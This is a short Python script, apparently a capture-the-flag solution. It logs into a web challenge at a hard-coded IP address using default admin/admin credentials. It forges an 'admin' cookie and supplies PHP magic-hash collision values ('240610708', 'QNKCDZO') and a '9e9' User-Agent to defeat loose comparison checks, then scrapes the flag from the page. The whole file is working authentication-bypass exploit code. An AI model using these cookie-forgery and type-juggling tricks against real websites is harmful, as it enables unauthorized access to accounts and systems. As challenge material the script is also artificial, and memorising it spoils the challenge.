import requests
from bs4 import BeautifulSoup

url = "http://18.192.3.151/ghaze/"


r1 = requests.post(url, data={'user_name':'admin', 'user_pass':'admin', 'submit':'Login'}, cookies={'admin':'True'})
new_url = r1.url+'?flag=View'

r2 = requests.post(new_url, cookies={'cc':'240610708', 'kk':'QNKCDZO'}, headers={'User-Agent':'9e9'})
soup = BeautifulSoup(r2.content, 'html.parser')
tags = soup.find_all('h1')
string=tags[2].text
flags = string.split('You')
final_flag=flags[0]+flags[1][37:]+flags[2][31:]
print(final_flag)
